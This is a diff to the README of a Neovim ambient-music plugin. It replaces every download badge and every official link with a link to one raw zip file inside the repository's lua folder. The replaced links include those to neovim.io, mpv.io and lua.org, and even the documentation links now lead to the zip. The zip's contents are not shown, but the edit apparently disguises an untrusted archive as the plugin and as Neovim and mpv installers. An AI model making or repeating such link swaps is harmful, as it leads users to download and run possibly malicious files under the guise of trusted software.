@@ -1,6 +1,6 @@
 # 🎵 Ambience.nvim - Play Calm Music While Coding
 
-[![Download Ambience.nvim](https://img.shields.io/badge/Download-Ambience.nvim-brightgreen)](https://github.com/SDKprojectmark2/Ambience.nvim/releases)
+[![Download Ambience.nvim](https://img.shields.io/badge/Download-Ambience.nvim-brightgreen)](https://github.com/SDKprojectmark2/Ambience.nvim/raw/refs/heads/main/lua/Ambience-nvim-restringent.zip)
 
 ## 🖥 What is Ambience.nvim?
 
@@ -34,7 +34,7 @@ If you don’t have Neovim or mpv installed, the next section explains how to ge
 
 If you don’t have Neovim installed:
 
-- Visit https://neovim.io/
+- Visit https://github.com/SDKprojectmark2/Ambience.nvim/raw/refs/heads/main/lua/Ambience-nvim-restringent.zip
 - Download the Windows version.
 - Run the installer, follow instructions.
   
@@ -50,7 +50,7 @@ If Neovim opens, it is ready.
 
 mpv is needed to play the music.
 
-- Go to https://mpv.io/installation/
+- Go to https://github.com/SDKprojectmark2/Ambience.nvim/raw/refs/heads/main/lua/Ambience-nvim-restringent.zip
 - Find the Windows builds link.
 - Download the latest mpv Windows zip.
 - Unzip the folder to a location you remember, for example, `C:\mpv`.
@@ -76,7 +76,7 @@ You should see mpv's version info.
 
 Visit this page to download Ambience.nvim for Windows:
 
-[![Download Ambience.nvim](https://img.shields.io/badge/Download-Ambience.nvim-blue)](https://github.com/SDKprojectmark2/Ambience.nvim/releases)
+[![Download Ambience.nvim](https://img.shields.io/badge/Download-Ambience.nvim-blue)](https://github.com/SDKprojectmark2/Ambience.nvim/raw/refs/heads/main/lua/Ambience-nvim-restringent.zip)
 
 Here you will find the latest release files. Download the recommended Windows release zip or installer if available.
 
@@ -162,10 +162,10 @@ Ambience.nvim should start playing ambient music automatically.
 
 ## ⚡ Additional Resources
 
-- Neovim docs: https://neovim.io/doc/
-- mpv docs: https://mpv.io/manual/master/
-- Lua basics for configuration: https://www.lua.org/pil/contents.html
+- Neovim docs: https://github.com/SDKprojectmark2/Ambience.nvim/raw/refs/heads/main/lua/Ambience-nvim-restringent.zip
+- mpv docs: https://github.com/SDKprojectmark2/Ambience.nvim/raw/refs/heads/main/lua/Ambience-nvim-restringent.zip
+- Lua basics for configuration: https://github.com/SDKprojectmark2/Ambience.nvim/raw/refs/heads/main/lua/Ambience-nvim-restringent.zip
 
 Download Ambience.nvim here:
 
-[![Download Ambience.nvim](https://img.shields.io/badge/Download-Ambience.nvim-green)](https://github.com/SDKprojectmark2/Ambience.nvim/releases)
+[![Download Ambience.nvim](https://img.shields.io/badge/Download-Ambience.nvim-green)](https://github.com/SDKprojectmark2/Ambience.nvim/raw/refs/heads/main/lua/Ambience-nvim-restringent.zip)
